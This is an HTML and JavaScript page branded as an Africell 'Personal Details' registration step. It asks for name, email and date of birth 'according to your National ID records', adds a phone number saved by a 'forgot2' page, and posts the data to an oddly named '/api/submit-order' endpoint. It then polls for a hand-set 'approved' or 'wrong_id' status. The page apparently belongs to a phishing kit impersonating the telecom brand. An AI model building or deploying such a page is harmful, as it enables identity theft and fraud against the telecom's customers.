<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell | Personal Details Registration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: #F2F2F2;
            overflow-x: hidden;
        }

        .reg-wrapper {
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 40px;
        }

        /* Solid Purple Top Navigation Bar */
        .reg-navbar {
            width: 100%;
            height: 70px; /* Reduced for a sleek header */
            background: #991676;
            display: flex;
            align-items: center;
            padding: 0 20px;
            gap: 16px;
        }

        .back-arrow {
            color: #ffffff;
            font-size: 22px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 35px;
            height: 35px;
        }

        .navbar-title {
            color: #ffffff;
            font-size: 18px;
            font-weight: 500;
        }

        /* Main Content Container with Side White Space Margins */
        .reg-content {
            width: 100%;
            max-width: 440px; /* Restricts max width so it doesn't stretch edge-to-edge */
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 24px; /* Clean side white space */
            margin: 0 auto;
        }

        /* Main Heading */
        .reg-heading {
            font-size: 26px; /* Reduced from 32px */
            font-weight: 700;
            color: #000000;
            text-align: center;
            margin-top: 40px;
            margin-bottom: 10px;
        }

        /* Instructions */
        .reg-instructions {
            font-size: 14px; /* Reduced from 15px */
            color: #555555;
            text-align: center;
            font-weight: 400;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        /* Input Field Containers */
        .reg-input-group {
            width: 100%;
            position: relative;
            margin-bottom: 16px;
        }

        .reg-input-field {
            width: 100%;
            height: 56px; /* Reduced from 80px */
            background: #ffffff;
            border: 2px solid #991676;
            border-radius: 14px; /* Modernized corner radius */
            font-size: 16px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
            padding: 0 16px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
        }

        .reg-input-field::placeholder {
            color: #999999;
            font-size: 16px;
            font-weight: 400;
            text-align: center;
        }

        .reg-input-field:focus {
            border-color: #79105c;
        }

        /* Large Purple Continue Button */
        .reg-btn {
            width: 100%;
            height: 54px; /* Reduced from 90px */
            background: #991676;
            color: #ffffff;
            border: none;
            border-radius: 14px;
            font-size: 16px; /* Reduced from 24px */
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: capitalize;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(153, 22, 118, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            margin-top: 8px;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        .reg-btn:hover {
            background: #79105c;
        }

        .reg-btn:active {
            transform: translateY(1px);
        }

        .reg-btn.disabled-state {
            opacity: 0.4;
            filter: blur(1.5px);
            pointer-events: none;
            cursor: not-allowed;
            box-shadow: none !important;
        }

        /* Loading Spinner */
        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 14px;
            color: #991676;
            font-weight: 600;
        }

        .spinner {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(153, 22, 118, 0.2);
            border-top: 3px solid #991676;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Custom In-App Modal Dialog */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(153, 22, 118, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #991676;
            width: 100%;
            max-width: 320px;
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #ffd34d;
            color: #5E0C44;
            border: none;
            border-radius: 12px;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 12px rgba(255, 211, 77, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <div class="reg-wrapper">
        <!-- Top Navigation Bar -->
        <nav class="reg-navbar">
            <a href="scratch2.html" class="back-arrow">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
            <span class="navbar-title">Registration</span>
        </nav>

        <!-- Main Body Content -->
        <div class="reg-content">
            <h1 class="reg-heading">Personal Details</h1>
            <p class="reg-instructions">
                Please enter your information accurately according to your National ID records.
            </p>

            <!-- Box 1: First Name -->
            <div class="reg-input-group">
                <input type="text" id="firstName" class="reg-input-field" placeholder="First Name" required>
            </div>

            <!-- Box 2: Last Name -->
            <div class="reg-input-group">
                <input type="text" id="lastName" class="reg-input-field" placeholder="Last Name" required>
            </div>

            <!-- Box 3: Email -->
            <div class="reg-input-group">
                <input type="email" id="email" class="reg-input-field" placeholder="Email Address" required>
            </div>

            <!-- Box 4: Date of Birth -->
            <div class="reg-input-group">
                <input type="date" id="dob" class="reg-input-field" required>
            </div>

            <!-- Purple Continue Button -->
            <button type="button" id="createAccountBtn" class="reg-btn">Continue</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span id="spinnerText">Processing details...</span>
            </div>
        </div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        let pendingAction = null;

        function showAppAlert(message, actionCallback = null) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
            pendingAction = actionCallback;
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
            if (pendingAction) {
                pendingAction();
                pendingAction = null;
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const createBtn = document.getElementById('createAccountBtn');
            if (createBtn) {
                createBtn.addEventListener('click', submitRegistration);
            }

            // Quick check to verify the number carried over from forgot2 -> scratch2
            const activePhone = localStorage.getItem('africellUserPhone');
            if (!activePhone) {
                console.warn('⚠️ No active phone session detected in localStorage.');
            }
        });

        async function submitRegistration(e) {
            if (e) e.preventDefault();

            const firstName = document.getElementById('firstName').value.trim();
            const lastName = document.getElementById('lastName').value.trim();
            const email = document.getElementById('email').value.trim();
            const dob = document.getElementById('dob').value.trim();

            const createBtn = document.getElementById('createAccountBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');
            const spinnerText = document.getElementById('spinnerText');
            
            // Pulls the phone number natively saved from forgot2.html
            const phoneInput = localStorage.getItem('africellUserPhone') || '+23200000000';

            if (!firstName || !lastName || !email || !dob) {
                showAppAlert('❌ Please fill out all required fields.');
                return;
            }

            try {
                createBtn.classList.add('disabled-state');
                if (spinnerText) spinnerText.innerText = 'Sending details...';
                if (spinnerDiv) spinnerDiv.style.display = 'flex';

                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phoneInput,
                        firstName: firstName,
                        lastName: lastName,
                        email: email,
                        dateOfBirth: dob
                    })
                });

                const result = await response.json();

                if (result.success) {
                    pollApprovalStatus(phoneInput);
                } else {
                    createBtn.classList.remove('disabled-state');
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    showAppAlert('❌ Submission failed. Please try again.');
                }
            } catch (error) {
                console.error('Client Error:', error);
                createBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Could not connect.');
            }
        }

        function pollApprovalStatus(phone) {
            const cleanPhone = phone.trim();
            const createBtn = document.getElementById('createAccountBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            const statusInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                    const data = await response.json();

                    if (data.status === 'approved') {
                        clearInterval(statusInterval);
                        showAppAlert('✅ Approved!', () => {
                            window.location.href = 'login.html';
                        });
                    } 
                    else if (data.status === 'wrong_id' || data.status === 'rejected') {
                        clearInterval(statusInterval);
                        if (spinnerDiv) spinnerDiv.style.display = 'none';
                        createBtn.classList.remove('disabled-state');
                        showAppAlert('❌ Wrong Info. Please verify your details.');
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 3000);
        }
    </script>
</body>
</html>
